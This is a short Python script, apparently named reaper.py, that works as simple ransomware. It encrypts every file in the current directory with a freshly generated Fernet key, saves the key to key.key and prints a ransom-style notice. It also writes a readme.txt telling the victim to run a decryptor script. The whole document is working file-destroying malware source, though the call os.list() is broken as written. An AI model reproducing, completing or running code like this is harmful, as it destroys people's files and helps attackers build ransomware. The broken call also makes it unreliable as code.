#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet


files = []

for file in os.list():
	if file=="reaper.py" or file == "key.key" or file=="reaperdecryptor.py":
		continue
	if os.path.isfile(file):
		files.append(file)

key = Fernet.generate_key()

with open("key.key", "wb") as thekey:
	thekey.write(key)

for file in files:
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_encrypted  = Fernet(key).encrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_encrypted)

print (" All your files are encrypted! Luckily we have a decoder! ;)")
print (" Find and run reaperdecryptor.py in the comman terminal to get your files back!")

readme = ('echo "Your files are encrypted! Run reaperdecryptor.py to get them back!" > readme.txt')
os.system(readme)
